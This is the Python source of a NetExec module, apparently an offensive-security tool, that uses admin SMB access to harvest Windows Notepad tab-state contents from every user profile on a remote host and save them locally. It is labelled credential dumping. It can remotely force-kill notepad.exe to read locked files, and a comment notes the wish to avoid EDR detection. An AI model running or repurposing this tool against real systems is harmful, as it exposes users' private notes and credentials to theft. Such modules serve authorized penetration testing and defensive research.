from io import BytesIO
from os import makedirs
from os.path import join, abspath
import re
import time
from nxc.helpers.misc import CATEGORY
from nxc.paths import NXC_PATH
from impacket.smbconnection import SessionError

smb_error_status = [
    "STATUS_ACCOUNT_DISABLED",
    "STATUS_ACCOUNT_EXPIRED",
    "STATUS_ACCOUNT_RESTRICTION",
    "STATUS_INVALID_LOGON_HOURS",
    "STATUS_INVALID_WORKSTATION",
    "STATUS_LOGON_TYPE_NOT_GRANTED",
    "STATUS_PASSWORD_EXPIRED",
    "STATUS_PASSWORD_MUST_CHANGE",
    "STATUS_ACCESS_DENIED",
    "STATUS_NO_SUCH_FILE",
    "KDC_ERR_CLIENT_REVOKED",
    "KDC_ERR_PREAUTH_FAILED",
]


class NXCModule:
    # Extracts content from Windows Notepad binary tab state files
    # Module by @termanix
    name = "notepad"
    description = "Extracts content from Windows Notepad tab state binary files."
    supported_protocols = ["smb"]
    category = CATEGORY.CREDENTIAL_DUMPING

    def __init__(self, context=None):
        self.context = context
        self.false_positive = [".", "..", "desktop.ini", "Public", "Default", "Default User", "All Users", ".NET v4.5", ".NET v4.5 Classic"]
        self.FILE_PATH_REGEX = r"^[A-Za-z]:\\(?:[^<>:\"/\\|?*]+\\)*[^<>:\"/\\|?*]+\.[\w]{1,5}$"

    def options(self, context, module_options):
        """KILL                // Kill for notepad.exe process. Default False."""
        if "KILL" not in module_options:
            self.kill = False
        else:
            self.kill = module_options["KILL"]

    def extract_strings(self, data, min_length=4):
        """Extract printable strings from binary data, similar to the strings command."""
        results = []

        # ASCII strings extraction
        ascii_strings = re.findall(b"[ -~]{%d,}" % min_length, data)
        for s in ascii_strings:
            try:
                results.append(("ASCII", s.decode("ascii")))
            except Exception as e:
                self.context.log.fail(f"Failed extracting ASCII strings: {e}")

        # UTF-16LE strings extraction (common in Windows)
        utf16_pattern = re.compile(b"(?:[\x20-\x7E]\x00){%d,}" % min_length)
        utf16_strings = utf16_pattern.findall(data)
        for s in utf16_strings:
            try:
                decoded = s.decode("utf-16-le")
                results.append(("UTF-16LE", decoded))
            except Exception as e:
                self.context.log.fail(f"Failed extracting UTF-16LE strings: {e}")

        return results

    def is_meaningful_content(self, string):
        """Check if a string has meaningful content."""
        # Filter out strings that are just repetitions of the same character
        if len(set(string)) <= 2 and len(string) > 4:
            return False

        # Filter out strings that don't have any letters or numbers
        if not any(c.isalnum() for c in string):
            return False

        # Filter out strings that look like memory addresses or hex dumps
        if re.match(r"^[0-9A-F]+$", string) and len(string) >= 8:
            return False

        # Filter out strings that are just whitespace or control characters
        if string.isspace():
            return False

        # Filter out common binary file markers that aren't actual content
        common_garbage = ["NULL", "true", "false", "xmlns", "http://", "https://", "COM1", "COM2", "COM3"]
        return string not in common_garbage

    def read_and_decode_file(self, connection, context, file_path, user):
        buf = BytesIO()
        try:
            connection.conn.getFile("C$", file_path, buf.write)
        except Exception as e:
            if "STATUS_SHARING_VIOLATION" in str(e):  # It means notepad.exe is open on target.
                if self.kill:
                    try:
                        context.log.debug(f"Trying to kill notepad.exe process for {user} user.")
                        # To Do: Kill process with RPC, connection.execute can be detect by EDRs and module wont work. Or copy the target bin files without trigger the EDRs
                        connection.execute("taskkill /IM notepad.exe /F")  # If notepad.exe open by user, needs to kill that process for reading files.
                        time.sleep(1)  # Sleep 1 sec for finding and reading processing
                        context.log.debug(f"Notepad process was successfully killed for {user}")
                        connection.conn.getFile("C$", file_path, buf.write)
                    except Exception as e:
                        context.log.debug(f"Alternative method failed: {e}")
                else:
                    context.log.fail("Notepad.exe is open on target. If want to kill process, add kill option true. (-o KILL=True)")
                    return []
            else:
                # If it's a different error, just skip this file
                context.log.debug(f"Error accessing {file_path}: {e}")

        buf.seek(0)
        binary_data = buf.read()

        # Return only the meaningful strings
        return [
            string for _, string in self.extract_strings(binary_data)
            if self.is_meaningful_content(string)
        ]

    def on_admin_login(self, context, connection):
        self.context = context
        context.log.display("Searching for Notepad cache...")
        for directory in connection.conn.listPath("C$", "Users\\*"):
            found = 0
            if directory.get_longname() in self.false_positive or not directory.is_directory():
                continue

            # Path for Windows Notepad tab state files
            notepad_dir = f"Users\\{directory.get_longname()}\\AppData\\Local\\Packages\\Microsoft.WindowsNotepad_8wekyb3d8bbwe\\LocalState\\TabState\\"
            try:
                for file in connection.conn.listPath("C$", f"{notepad_dir}\\*"):
                    if file.get_longname() not in self.false_positive and file.get_longname().endswith(".bin"):
                        file_path = f"{notepad_dir}{file.get_longname()}"

                        # Read the binary file
                        meaningful_strings = self.read_and_decode_file(connection, context, file_path, directory.get_longname())

                        if meaningful_strings:
                            found += 1
                            context.log.highlight(f"C:\\{file_path}")

                            # Output content
                            content_lines = []

                            # First loop to handle meaningful strings
                            for string in meaningful_strings:
                                if bool(re.match(self.FILE_PATH_REGEX, string)):  # Only needed if checking locally
                                    # Read the file into a buffer
                                    meaningful_strings = self.read_and_decode_file(connection, context, string[2:], directory.get_longname())

                                    # Second loop to handle content inside the file
                                    for string in meaningful_strings:
                                        context.log.highlight(f"\t{string}")
                                        content_lines.append(string)  # Store the string value only
                                else:
                                    context.log.highlight(f"\t{string}")
                                    content_lines.append(string)  # Store the string value only

                            # Save to file
                            filename = f"{connection.host}_{directory.get_longname()}_notepad_tabstate_{found}.txt"
                            export_path = join(NXC_PATH, "modules", "notepad")
                            path = abspath(join(export_path, filename))
                            makedirs(export_path, exist_ok=True)

                            with open(path, "w+") as output_file:
                                output_file.write(f"Source: C:\\{file_path}\n\n")
                                output_file.write("\n".join(content_lines))  # Write strings line by line
                            context.log.success(f"Notepad tab state content written to: {path}")
            except SessionError as e:
                error = self.get_error_string(e)
                if error == "STATUS_OBJECT_NAME_NOT_FOUND" or error == "STATUS_OBJECT_PATH_NOT_FOUND":
                    context.log.debug(f"Failed for user {directory.get_longname()}: {e}")
                else:
                    context.log.fail(
                        f"Error enumerating shares: {error}",
                        color="magenta" if error in smb_error_status else "red",
                    )
        if found == 0:
            context.log.info("No Notepad tab state files with meaningful content found")

    def get_error_string(self, exception):
        if hasattr(exception, "getErrorString"):
            try:
                es = exception.getErrorString()
            except KeyError:
                return f"Could not get nt error code {exception.getErrorCode()} from impacket: {exception}"
            if type(es) is tuple:
                return es[0]
            else:
                return es
        else:
            return str(exception)
